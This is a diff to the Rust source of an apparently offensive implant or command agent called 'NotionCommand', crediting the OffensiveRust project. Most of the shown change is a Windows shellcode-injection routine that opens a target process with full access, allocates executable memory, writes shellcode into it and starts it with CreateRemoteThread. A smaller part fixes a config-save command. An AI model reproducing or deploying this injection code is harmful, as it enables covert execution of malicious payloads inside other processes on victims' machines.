@@ -1,5 +1,6 @@
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
+#[cfg(windows)] use std::ptr;
 use serde_json::to_string as json_to_string;
 use std::error::Error;
 use std::result::Result;
@@ -167,11 +168,11 @@ impl NotionCommand {
                         // Big thanks to trickster0
                         // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                         unsafe {
-                            let mut h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
-                            let mut addr = kernel32::VirtualAllocEx(h,ptr::null_mut(),shellcode.len() as u64,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+                            let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
+                            let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                             let mut n = 0;
                             kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
-                            let mut hThread = kernel32::CreateRemoteThread(h,ptr::null_mut(),0,Some(std::mem::transmute(addr)), ptr::null_mut(), 0,ptr::null_mut());
+                            let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                             kernel32::CloseHandle(h);
                         }
                         return Ok("Injection completed!".to_string());
@@ -189,9 +190,11 @@ impl NotionCommand {
                 Ok("Can only inject shellcode on Windows!".to_string())
             }
             CommandType::Save(s) => {
-                config_options.config_file_path = s.to_string();
-                write(s.trim(), json_to_string(config_options)?)?;
-                Ok("Config file saved to {s}".to_string())
+                if !s.is_empty() {
+                    config_options.config_file_path = s.to_string();
+                }
+                write(config_options.config_file_path.trim(), json_to_string(config_options)?)?;
+                Ok(format!("Config file saved to {s}").to_string())
             },
             CommandType::Shutdown => {
                 return Ok(String::from("Shutting down"));
